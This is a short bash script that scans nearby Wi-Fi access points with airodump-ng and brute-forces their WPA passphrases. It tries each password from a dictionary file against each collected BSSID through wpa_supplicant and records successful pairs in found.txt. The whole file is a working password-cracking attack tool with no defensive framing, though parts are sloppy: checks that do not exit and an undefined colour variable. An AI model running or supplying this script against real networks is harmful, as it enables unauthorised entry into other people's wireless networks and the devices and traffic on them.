#!/bin/bash

# ========== COLORS ==========
DEF='\033[0m'
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
GRAY='\033[0;37m'
WHITE='\033[1;37m'
# ========== COLORS ==========

# ========== INIT ==========
# CHECK ROOT
if [[ "$(id -u)" != "0" ]];
then
  echo -e "${RED}Script must be run as root!${DEF}"
  #exit 1
fi

# CHECK COUNT OF ARGUMENTS
if (( $# != 2 ));
then
  echo -e "${RED}Invalid arguments${DEF}"
fi

# CHECK HELP
for arg in $*;
do
  if [[ "$arg" == "--help" ]];
  then
    echo "usage: sudo ./get_bssid_script.sh <interface> <dict>"
    exit 1
  fi
done

INTERFACE=$1
DICT=$2

SCAN_TIME=6
#exit 1

# ==========================

# ========== GET BSSID ==========
airodump-ng $INTERFACE --output-format csv -w air &
sleep $SCAN_TIME
killall airodump-ng
touch bssid.txt
sleep 1

cat air-01.csv | awk {'print $1'} | grep --colour=never ":" | sed 's/.$//' > bssid.txt
count=$(cat bssid.txt | wc -l)

timeout 2 ifconfig $INTERFACE down
timeout 2 iwconfig $INTERFACE mode managed
timeout 2 ifconfig $INTERFACE up

echo "[+] Complete!!!"
echo "Count bssid's: $count"
# ===============================

# ========== CRACK ==========
c=0
IFS=$'\n'
for bss in $(cat bssid.txt);
do
  for pass in $(cat $DICT);
  do
    c=$((c+=1))
    echo -e "${GREY}[$c]\tTry... $bss : $pass${DEF}"
    echo -e "\tnetwork={" > wpa_supplicant.conf
    echo -e "\tbssid=$bss" >> wpa_supplicant.conf
    echo -e "\tpsk=\"$pass\"" >> wpa_supplicant.conf
    echo "}" >> wpa_supplicant.conf
    
    timeout 15 wpa_supplicant -i $INTERFACE -c wpa_supplicant.conf 2>&1 > wpa_supplicant.log

    if grep -q "completed" "wpa_supplicant.log";
    then
      echo -e "${GREEN}[+] Found $bss:$pass${DEF}"
      echo "[+] $bss:$pass" >> found.txt
    else
      echo -e "${RED}[-] $bss:$pass${DEF}"
    fi

 done
  echo ""
done


# ===========================



# ========== CLEAN ==========
rm -rf air-01.csv bssid.txt wpa_supplicant.*
